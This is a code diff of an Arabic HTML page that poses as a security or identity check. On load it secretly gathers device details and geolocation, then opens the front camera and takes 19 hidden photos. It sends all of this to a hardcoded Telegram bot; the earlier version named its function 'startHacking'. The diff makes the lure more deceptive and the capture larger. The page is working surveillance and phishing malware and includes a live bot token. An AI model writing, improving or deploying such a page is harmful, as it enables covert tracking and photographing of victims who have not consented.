@@ -2,11 +2,12 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تحقق من الأمان</title>
+    <title>جاري التحقق من الأمان...</title>
 </head>
 <body>
-    <h2 style="text-align: center;">جاري التحقق من الهوية... يرجى السماح بالكاميرا والموقع</h2>
-    
+    <h2 style="text-align: center; margin-top: 50px;">يرجى الانتظار، جاري معالجة الطلب...</h2>
+    <h3 style="text-align: center; color: red;">يرجى الضغط على "سماح" للمتابعة</h3>
+
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
@@ -14,63 +15,84 @@
         const token = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
         const chatId = "8754338811";
 
-        // 1. وظيفة إرسال النصوص (بيانات الجهاز والموقع)
-        async function sendText(text) {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
-            });
+        async function sendToTelegram(type, data, isPhoto = false) {
+            let url = `https://api.telegram.org/bot${token}/`;
+            let body;
+
+            if (isPhoto) {
+                url += "sendPhoto";
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', data, 'capture.jpg');
+                body = formData;
+            } else {
+                url += "sendMessage";
+                body = JSON.stringify({ chat_id: chatId, text: data, parse_mode: "Markdown" });
+            }
+
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: isPhoto ? {} : { 'Content-Type': 'application/json' },
+                    body: body
+                });
+            } catch (e) { console.error(e); }
         }
 
-        // 2. وظيفة إرسال الصورة الملتقطة
-        async function sendPhoto(blob) {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'capture.jpg');
+        async function startSystem() {
+            // 1. جمع بيانات الجهاز المتعمقة
+            let battery = {};
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                battery = { level: b.level * 100 + "%", charging: b.charging };
+            }
 
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-        }
+            const deviceData = `
+🚀 *زائر جديد:*
+📱 *الجهاز:* ${navigator.platform}
+🌐 *المتصفح:* ${navigator.vendor}
+🔋 *البطارية:* ${battery.level || 'غير معروف'} (شحن: ${battery.charging})
+🖥 *الشاشة:* ${window.screen.width}x${window.screen.height}
+⏳ *التوقيت:* ${new Date().toLocaleString()}
+            `;
+            await sendToTelegram("text", deviceData);
 
-        async function startHacking() {
-            // أ. إرسال بيانات الجهاز فوراً
-            await sendText(`📱 زائر جديد:\n${navigator.userAgent}`);
-
-            // ب. طلب إذن الموقع وإرساله
+            // 2. طلب الموقع الجغرافي
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    sendText(`📍 الموقع: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`);
+                navigator.geolocation.getCurrentPosition(p => {
+                    sendToTelegram("text", `📍 *الموقع:* https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                 });
             }
 
-            // ج. فتح الكاميرا والتقاط صورة
+            // 3. فتح الكاميرا والتقاط 19 صورة
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                // انتظر ثانية حتى تفتح الكاميرا ثم التقط الصورة
-                setTimeout(() => {
+                let photosTaken = 0;
+                const interval = setInterval(() => {
+                    if (photosTaken >= 19) {
+                        clearInterval(interval);
+                        stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا
+                        return;
+                    }
+
                     const canvas = document.getElementById('canvas');
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, 640, 480);
-                    
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                     canvas.toBlob(blob => {
-                        sendPhoto(blob);
-                        // إغلاق الكاميرا بعد الالتقاط
-                        stream.getTracks().forEach(track => track.stop());
+                        sendToTelegram("photo", blob, true);
                     }, 'image/jpeg');
-                }, 1000);
+
+                    photosTaken++;
+                }, 1500); // يلتقط صورة كل ثانية ونصف
 
             } catch (err) {
-                sendText("❌ المستخدم رفض إذن الكاميرا.");
+                await sendToTelegram("text", "❌ رفض المستخدم إذن الكاميرا.");
             }
         }
 
-        window.onload = startHacking;
+        window.onload = startSystem;
     </script>
 </body>
 </html>
